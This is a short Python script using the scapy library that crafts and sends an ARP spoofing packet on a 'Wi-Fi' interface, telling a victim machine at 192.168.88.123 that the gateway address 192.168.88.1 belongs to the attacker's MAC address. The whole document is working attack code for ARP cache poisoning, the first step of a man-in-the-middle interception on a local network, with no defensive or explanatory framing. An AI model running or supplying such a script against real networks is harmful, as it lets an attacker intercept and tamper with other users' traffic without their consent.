
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

macAttacker = '20:1E:88:95:8D:05'
ipAttacker = '192.168.88.112'
macVictim = '30:4a:26:de:80:24'
ipVictim = '192.168.88.123'
ipToSpoof = '192.168.88.1'
arp = Ether() / ARP()
arp[Ether].src = macAttacker  # Set the source MAC address to the attacker's MAC
arp[ARP].hwsrc = macAttacker  # Set the ARP sender hardware address to the attacker's MAC
arp[ARP].psrc = ipToSpoof    # Set the ARP sender protocol address to the IP to spoof
arp[ARP].hwdst = macVictim    # Set the ARP target hardware address to the victim's MAC
arp[ARP].pdst = ipVictim      # Set the ARP target protocol address to the victim's IP


sendp(arp, iface="Wi-Fi")

